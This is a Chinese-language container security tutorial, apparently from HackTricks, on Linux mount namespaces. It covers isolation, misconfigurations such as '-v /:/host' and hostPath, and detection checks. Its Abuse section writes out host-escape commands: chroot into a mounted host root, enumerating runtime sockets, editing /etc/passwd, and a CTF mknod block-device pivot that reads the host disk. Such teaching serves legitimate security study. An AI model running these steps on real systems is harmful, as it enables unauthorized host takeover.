# 挂载命名空间

{{#include ../../../../../banners/hacktricks-training.md}}

## 概述

挂载命名空间控制进程所看到的 **mount table**。这是容器隔离中最重要的特性之一，因为根文件系统、bind mounts、tmpfs mounts、procfs 视图、sysfs 暴露以及许多运行时特定的辅助挂载，都是通过该挂载表来表达的。两个进程可能都能访问 `/`、`/proc`、`/sys` 或 `/tmp`，但这些路径最终解析到哪里取决于它们所属的挂载命名空间。

从容器安全的角度看，挂载命名空间常常区分“这是一个为应用精心准备的文件系统”和“该进程可以直接看到或影响宿主机文件系统”之间的差别。这就是为什么 bind mounts、`hostPath` volumes、privileged mount operations，以及可写的 `/proc` 或 `/sys` 暴露都围绕这个命名空间展开的原因。

## 工作原理

当 runtime 启动一个容器时，通常会创建一个新的挂载命名空间，为容器准备根文件系统，根据需要挂载 procfs 和其他辅助文件系统，然后可选地添加 bind mounts、tmpfs mounts、secrets、config maps 或 host paths。一旦该进程在命名空间内运行，它看到的挂载集合在很大程度上就与宿主机的默认视图解耦。宿主机仍然可以看到真实的底层文件系统，但容器看到的是 runtime 为其组装的那个版本。

这很强大，因为它允许容器相信自己拥有自己的根文件系统，尽管宿主机仍在管理一切。它也很危险，因为如果 runtime 暴露了错误的挂载，进程就会突然获得对宿主资源的可见性，而安全模型的其余部分可能并未为此做设计保护。

## 实验

你可以通过以下方式创建一个私有挂载命名空间：
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
如果你在该命名空间之外打开另一个 shell 并检查挂载表，你会看到 tmpfs 挂载只存在于隔离的挂载命名空间内。这个练习很有用，因为它表明挂载隔离并非抽象理论；内核实际上是向进程呈现了一个不同的挂载表。
如果你在该命名空间之外打开另一个 shell 并检查挂载表，tmpfs 挂载将只存在于隔离的挂载命名空间内。

在容器内部，简单比较如下：
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
第二个示例演示了运行时配置如何轻易在文件系统边界上打出一个巨大的漏洞。

## Runtime Usage

Docker、Podman、基于 containerd 的堆栈和 CRI-O 都依赖于私有的 mount namespace 来运行普通容器。Kubernetes 在同一机制之上实现了 volumes、projected secrets、config maps 和 `hostPath` 挂载。Incus/LXC 环境也严重依赖 mount namespaces，特别是因为 system containers 通常比 application containers 暴露更丰富、更接近机器的文件系统。

这意味着，当你审查容器文件系统问题时，通常不是在看一个孤立的 Docker 怪癖。你是通过启动工作负载的任何平台看到一个 mount-namespace 和运行时配置问题。

## Misconfigurations

最明显且最危险的错误是通过 bind mount 暴露主机根文件系统或其他敏感主机路径，例如 `-v /:/host` 或 Kubernetes 中可写的 `hostPath`。到那时，问题不再是“容器是否能以某种方式逃逸？”，而是“有多少有用的主机内容已经可以直接被查看和写入？”可写的主机 bind mount 常常会使后续利用变成简单的文件放置、chroot、配置篡改或运行时 socket 发现问题。

另一个常见问题是以绕过更安全的容器视图的方式暴露主机的 `/proc` 或 `/sys`。这些文件系统不是普通的数据挂载点；它们是内核和进程状态的接口。如果工作负载直接访问主机的这些版本，许多容器加固背后的假设就不再适用。

只读保护也很重要。只读根文件系统并不会神奇地使容器变得安全，但它会移除大量攻击者的临时空间，并使持久化、放置辅助二进制和篡改配置变得更困难。相反，可写根或可写的主机 bind mount 会给攻击者留出准备下一步的空间。

## Abuse

当 mount namespace 被滥用时，攻击者通常会做四件事中的一件：他们会**读取本应留在容器外的主机数据**。他们会通过可写的 bind mount **修改主机配置**。如果 capabilities 和 seccomp 允许，他们会**挂载或重新挂载额外资源**。或者他们会访问允许他们向容器平台本身请求更多权限的**强力 sockets 和运行时状态目录**。

如果容器已经能看到主机文件系统，其余的安全模型会立即发生变化。

当你怀疑存在主机 bind mount 时，首先确认可用的内容以及是否可写：
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
如果主机根文件系统以读写方式挂载，直接访问主机通常很简单：
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
如果目标是特权 runtime 访问而不是直接 chrooting，则枚举 sockets 和 runtime 状态：
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
如果 `CAP_SYS_ADMIN` 存在，还要测试是否可以在容器内部创建新的挂载：
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### 完整示例：Two-Shell `mknod` Pivot

当容器的 root 用户能够创建块设备，主机和容器在用户标识方面以有利的方式共享，并且攻击者已经在主机上拥有低权限的立足点时，会出现一种更专门的滥用路径。在这种情况下，容器可以创建像 `/dev/sda` 这样的设备节点，低权限的主机用户随后可以通过对应容器进程的 `/proc/<pid>/root/` 读取它。

在容器内：
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
从宿主机，以匹配的低权限用户身份，在定位到容器 shell 的 PID 之后：
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
重要的教训不是精确的 CTF 字符串搜索。关键在于通过 `/proc/<pid>/root/` 的 mount-namespace 暴露可以让主机用户重用容器创建的设备节点，即使 cgroup 设备策略阻止了在容器内直接使用它们。

## Checks

这些命令用于显示当前进程实际所处的文件系统视图。目标是找出来源于主机的挂载点、可写的敏感路径，以及任何看起来比正常应用容器根文件系统更宽泛的内容。
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
这里值得注意：

- 来自宿主机的 Bind mounts，特别是 `/`、`/proc`、`/sys`、运行时状态目录或 socket 位置，应当立即显眼。
- 意外的 read-write mounts 通常比大量的 read-only helper mounts 更重要。
- `mountinfo` 往往是查看某路径是否真来自宿主机或由 overlay 支持的最佳地点。

这些检查可以确定 **哪些资源在该命名空间中可见**、**哪些来自宿主机**，以及 **哪些是可写的或安全敏感的**。
